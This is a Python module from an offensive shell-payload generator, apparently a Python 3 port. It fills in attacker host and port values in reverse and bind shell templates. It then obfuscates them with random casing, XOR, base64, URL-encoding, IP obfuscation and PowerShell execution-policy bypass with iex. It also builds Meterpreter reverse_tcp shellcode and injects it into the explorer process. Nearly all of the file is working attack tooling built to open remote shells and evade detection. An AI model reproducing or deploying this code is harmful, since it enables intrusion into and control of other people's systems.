from .obfuscators import randomize_vars, ipfuscate, obfuscate_port
from .encoders import powershell_base64, xor, to_unicode, to_urlencode
from binascii import hexlify
from .binary import shellcode_to_hex, shellcode_to_ps1, WINDOWS_BLOODSEEKER_SCRIPT
from sys import exit
import platform
import os
import string
import base64  # <-- ADDED for base64 encoding/decoding


# Fix: string.letters doesn't exist in Python 3; also must be bytes to match os.urandom(1)
ASCII_LETTERS_BYTES = string.ascii_letters.encode('ascii')  # b'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'


def generate_file_name(extension=""):
    file_name = ""
    while len(file_name) < 8:
        random_char = os.urandom(1)
        if random_char in ASCII_LETTERS_BYTES:  # Compare bytes to bytes
            file_name += random_char.decode('ascii')  # Decode to str for concatenation
    return file_name + extension


class OperationalSystem(object):
    def __init__(self):
        self.OS = "linux" if "linux" in platform.platform().lower() else "windows"


SysOS = OperationalSystem()


def info(msg):
    if SysOS.OS == "linux":
        msg = "[\033[094m+\033[0m] {0}".format(msg)
    else:
        msg = "[+] {0}".format(msg)
    return msg


def error(msg):
    if SysOS.OS == "linux":
        msg = "[\033[091m!\033[0m] {0}".format(msg)
    else:
        msg = "[!] {0}".format(msg)
    return msg


def alert(msg):
    if SysOS.OS == "linux":
        msg = "[\033[093mALERT\033[0m] {0}".format(msg)
    else:
        msg = "[ALERT] {0}".format(msg)
    return msg


def random_case_shuffle(data):
    out = ""
    for char in data:
        out += char.upper() if ord(os.urandom(1)) % 2 == 0 else char.lower()
    return out


def powershell_wrapper(name, code, args):
    if args.powershell_x86 is True:
        code = code.replace("powershell.exe", "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe")
    elif args.powershell_x64 is True:
        code = code.replace("powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe")

    if "powershell" in name.lower() and args.powershell_random_case is True:
        code = random_case_shuffle(code)
    return code


def xor_wrapper(name, code, args, shell="/bin/bash"):
    if args.shell != "":  # was: is not ""
        shell = args.shell
    if "powershell" not in name.lower():
        if "windows" not in name.lower():
            code = """VAR1="";for VAR2 in $(echo {0}|sed "s/../&\\n/g"); do VAR1=$VAR1$(echo -e $(awk "BEGIN {{printf \\"%x\\n\\", xor(0x$VAR2, {1})}}"|sed "s/../\\\\\\\\x&/g"));done;echo $VAR1|{2}""".format(hexlify(xor(code, args.xor)), hex(args.xor), shell)
            code = shell + " -c '" + code + "'"
            code = randomize_vars(code, args.obfuscate_small)
    else:
        if "-Command" in code:
            prefix, xcode = code.split("-Command")
        else:
            prefix = "powershell.exe -nop -ep bypass "
            xcode = code
        pcode = xcode.replace('"', "")
        code = to_unicode(pcode)
        code = xor(code, args.xor)
        code = powershell_base64(code, unicode_encoding=False)
        code = """ $VAR1={0};$VAR2='{1}';$VAR3=[Convert]::FromBase64String($VAR2);$VAR4=foreach($VAR5 in $VAR3) {{$VAR5 -bxor $VAR1}};$VAR7=[System.Text.Encoding]::Unicode.GetString($VAR4);iex $VAR7""".format(args.xor, code)
        code = prefix + "-Command " + '"%s"' % code
        code = randomize_vars(code, args.obfuscate_small)
    return code


def base64_wrapper(name, code, args, shell="/bin/bash"):
    if args.shell != "":  # was: is not ""
        shell = args.shell
    if args.base64 is True:
        if "powershell" not in name.lower():
            if "windows" not in name.lower():
                # Python 3: use base64.b64encode
                encoded = base64.b64encode(code.encode()).decode().replace("\n", "")
                code = "echo " + encoded + "|base64 -d|{0}".format(shell)
        else:
            if "-command" in code.lower():
                parts = code.lower().split("-command") if args.powershell_random_case else code.split("-Command")
                prefix, xcode = parts[0], parts[1] if len(parts) > 1 else ""
            else:
                prefix = "powershell.exe -nop -ep bypass "
                xcode = code

            pcode = xcode.replace('"', "")
            pcode = powershell_wrapper(name, pcode, args)
            # Skip first char if it's a space or quote? Original had [1:], keep it.
            code = prefix + "-Encoded " + powershell_base64(pcode[1:])
    return code


class Shell(object):
    def __init__(self, name, short_name, shell_type, proto, code, system=None, lang=None, arch=None, use_handler=None, use_http_stager=None):
        self.name = name
        self.type = shell_type
        self.proto = proto
        self.code = code
        self.short_name = short_name if len(short_name) > 0 else "generic"

        self.system_os = "unknown" if system is None else system
        self.lang = "unknown" if lang is None else lang
        self.arch = "unknown" if arch is None else arch
        self.handler = None if use_handler is None else use_handler
        self.handler_args = None

        self.use_http_stager = False if use_http_stager is None else use_http_stager


    def get_full_name(self):
        return self.system_os + "/" + self.type + "/" + self.proto + "/" + self.short_name


class ReverseShell(object):
    def __init__(self, name, lang, args, code):
        self.name = name
        self.lang = lang
        self.args = args
        self.host = args.host
        self.port = args.port
        self.code = code
        self.payload = str()

    def get(self):
        if self.args.ipfuscate and self.lang != "powershell":
            self.host = ipfuscate(self.host, self.args.obfuscate_small)
            self.port = obfuscate_port(self.port, self.args.obfuscate_small, self.lang)

        if "TARGET" in self.code and "PORT" in self.code:
            self.code = str(self.code.replace("TARGET", self.host)).replace("PORT", str(self.port))
            self.code = randomize_vars(self.code, self.args.obfuscate_small, self.lang)
            self.code = powershell_wrapper(self.name, self.code, self.args)
        else:
            if "bat2meterpreter" in self.name.lower():
                print(info("Generating shellcode ..."))
                return self.code + shellcode_to_hex("windows/meterpreter/reverse_tcp", self.args.host, self.args.port)

            if "bloodseeker" in self.name.lower():
                if self.args.stager is None:
                    print(error("This payload REQUIRES --stager flag."))
                    exit(1)

                print(info("Generating shellcode ..."))
                # Python 3: base64 decode
                malicious_script = base64.b64decode(WINDOWS_BLOODSEEKER_SCRIPT).decode('utf-8')  # assuming it's a base64-encoded string
                malicious_script = malicious_script.replace("SHELLCODEHERE", shellcode_to_ps1("windows/x64/meterpreter/reverse_tcp", self.args.host, self.args.port))

                process_name = "explorer"
                self.code = malicious_script.replace("PROCESSNAME", process_name)
                print(alert("Make sure you have a handler for windows/x64/meterpreter/reverse_tcp listening in your machine."))
                return self.code
            else:
                print(error("No custom shell procedure was arranged for this shell. This is fatal."))
                exit(1)

        # Apply xor encoding.
        self.code = self.code if self.args.xor == 0 else xor_wrapper(self.name, self.code, self.args)  # was: is 0

        # Apply base64 encoding.
        self.code = base64_wrapper(self.name, self.code, self.args)

        # Apply URL-encoding
        if self.args.urlencode is True and self.args.stager is None:
            self.code = to_urlencode(self.code)

        return self.code


class BindShell(object):
    def __init__(self, name, lang, args, code):
        self.name = name
        self.lang = lang
        self.args = args
        self.port = args.port
        self.code = code
        self.payload = str()

    def get(self):
        if self.args.ipfuscate:
            self.port = obfuscate_port(self.port, self.args.obfuscate_small, self.lang)

        self.code = self.code.replace("PORT", str(self.port))
        self.code = randomize_vars(self.code, self.args.obfuscate_small, self.lang)
        self.code = powershell_wrapper(self.name, self.code, self.args)

        self.code = self.code if self.args.xor == 0 else xor_wrapper(self.name, self.code, self.args)  # was: is 0
        self.code = base64_wrapper(self.name, self.code, self.args)

        if self.args.urlencode is True:
            self.code = to_urlencode(self.code)

        return self.code
